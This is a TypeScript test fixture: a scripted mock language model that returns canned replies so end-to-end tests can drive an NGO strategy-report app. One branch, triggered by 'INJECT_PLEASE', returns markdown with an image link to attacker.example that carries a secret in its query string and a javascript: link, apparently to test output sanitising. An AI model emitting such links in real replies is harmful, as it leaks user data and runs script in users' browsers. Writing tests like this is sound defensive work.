import "server-only";
import { simulateReadableStream } from "ai";
import { MockLanguageModelV4 } from "ai/test";

// A deterministic stand-in model for end-to-end tests (LENS_MOCK_LLM=1).
// It answers from the last user message so tests can drive each UI path.

const marker = (o: object) => "\n<!--lens-state " + JSON.stringify(o) + "-->";

type PromptMessage = { role: string; content: unknown };

function textOf(content: unknown): string {
  if (typeof content === "string") return content;
  if (Array.isArray(content)) return content.map((p) => (p && p.type === "text" ? p.text : "")).join("");
  return "";
}

export function reply(prompt: PromptMessage[]): string {
  const system = prompt.filter((m) => m.role === "system").map((m) => textOf(m.content)).join("\n");
  const last = textOf([...prompt].reverse().find((m) => m.role === "user")?.content);
  const lens = last.match(/perspective of: ([^.]+)\./)?.[1];
  if (/FAIL_PLEASE/.test(last)) throw new Error("Scripted provider failure");
  if (/THEORY OF CHANGE EXTRACTION/.test(last)) {
    const asked = prompt.filter((m) => m.role === "user").map((m) => textOf(m.content)).join(" ");
    if (/GARBLED_PLEASE/.test(asked)) return "Sorry, here is a summary instead.";
    return "```json\n" + JSON.stringify({
      organization: "Bright Futures Coding Clubs",
      problem: "Girls in Benin City have little access to digital skills training.",
      population: "Girls aged 12 to 17 in public secondary schools, Benin City",
      inputs: ["Two foundation grants", "Volunteer coaches", "Donated laptops"],
      activities: ["Weekly after-school coding clubs", "Mentoring by women in tech", "Annual demo day"],
      outputs: ["120 girls complete a 12-week course", "40 projects shown at demo day"],
      shortTermOutcomes: ["Girls gain basic coding skills", "Confidence with computers rises"],
      longTermOutcomes: ["Inferred: More girls choose STEM subjects", "Graduates find tech internships"],
      impact: "Young women in Edo State build careers in the digital economy.",
      assumptions: [
        { text: "Schools give clubs a room and time each week", link: "inputs-activities", evidence: "strong" },
        { text: "Girls keep attending despite household chores", link: "activities-outputs", evidence: "some" },
        { text: "Skills from 12 weeks are enough to change choices", link: "outputs-outcomes", evidence: "none" },
        { text: "Local tech firms hire young women", link: "outcomes-impact", evidence: "none" },
      ],
      gaps: ["No follow-up after girls leave the club", "No baseline of skills"],
      risks: ["Grant renewal in 2027 is uncertain", "Power cuts disrupt sessions"],
    }) + "\n```";
  }
  if (/INJECT_PLEASE/.test(last)) {
    return "Summary ![chart](https://attacker.example/leak?q=secret) and [source](javascript:alert(1)) and [ok](https://example.org)";
  }
  if (/Alignment Report/.test(last)) {
    return "# NGO Strategy and Alignment Report\n\n## Organizational purpose\nScripted purpose.\n\n" +
      Array.from({ length: 30 }, (_, i) => `## Section ${i + 1}\nInputs $\\rightarrow$ outcomes, line ${i + 1}.`).join("\n\n") +
      marker({ stage: "report", current: 0, covered: [1, 2], lens: "" });
  }
  if (lens) {
    return `Speaking as ${lens}. **What decisions do I control here?**` + marker({ stage: "diagnose", current: 3, covered: [2], lens });
  }
  if (/\bdocs?\b/i.test(last)) {
    const names = [...system.matchAll(/^=== (.+) ===$/gm)].map((m) => m[1]);
    return "Documents seen: " + (names.join(", ") || "none") + marker({ stage: "setup", current: 0, covered: [], lens: "" });
  }
  return "Promising start. **Who defines the problem: the organization or the community?**" +
    marker({ stage: "diagnose", current: 2, covered: [1], lens: "" });
}

export function scriptedModel() {
  return new MockLanguageModelV4({
    doStream: async ({ prompt }) => {
      const text = reply(prompt as PromptMessage[]);
      const words = text.split(/(?<= )/);
      return {
        stream: simulateReadableStream({
          chunkDelayInMs: 5,
          chunks: [
            { type: "text-start", id: "t" },
            ...words.map((w) => ({ type: "text-delta" as const, id: "t", delta: w })),
            { type: "text-end", id: "t" },
            {
              type: "finish",
              finishReason: { unified: "stop", raw: undefined },
              usage: {
                inputTokens: { total: 1, noCache: 1, cacheRead: undefined, cacheWrite: undefined },
                outputTokens: { total: 1, text: 1, reasoning: undefined },
              },
            },
          ],
        }),
      };
    },
  });
}
